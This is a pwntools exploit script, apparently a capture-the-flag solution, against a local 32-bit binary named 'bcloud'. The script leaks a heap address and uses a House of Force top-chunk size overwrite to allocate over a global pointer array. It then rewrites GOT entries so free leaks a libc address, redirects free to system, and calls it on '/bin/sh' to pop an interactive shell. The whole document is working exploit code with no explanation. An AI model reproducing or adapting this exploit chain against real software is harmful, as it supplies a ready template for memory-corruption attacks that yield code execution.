from pwn import *
def cmd(c):
	p.sendlineafter("--->>\n",str(c))
def add(size,c):
	cmd(1)
	p.sendlineafter("tent:\n",str(size))
	p.sendafter("tent:\n",c)
def free(idx):
	cmd(4)
	p.sendlineafter("id:\n",str(idx))
def edit(idx,c):
	cmd(3)
	p.sendlineafter("id:\n",str(idx))
	p.sendafter("tent:\n",c)
#context.log_level='debug'
p=process("./bcloud")
p.sendafter("name:\n","A"*0x40)
p.readuntil("A"*0x40)
heap=u32(p.read(4))-8
log.warning(hex(heap))

p.sendafter("Org:\n","A"*0x40)
p.sendafter("Host:\n",p32(0xfffffff1)+"\n")
array=0x804B0A0
off=array-heap-0xf0
add(off,"A\n")#0
add(0x200,p32(0x50)*34+p32(0x804b014)+p32(0x804b024)+"\n")#1
edit(0,p32(0x08048520)+'\n')
free(1)
base=u32(p.read(4))-(0xf7e65ca0-0xf7e06000)
log.warning(hex(base))
edit(0,p32(0xf7e40da0-0xf7e06000+base)+'\n')
add(0x20,'/bin/sh'+'\n')
free(1)
#gdb.attach(p)
p.interactive()
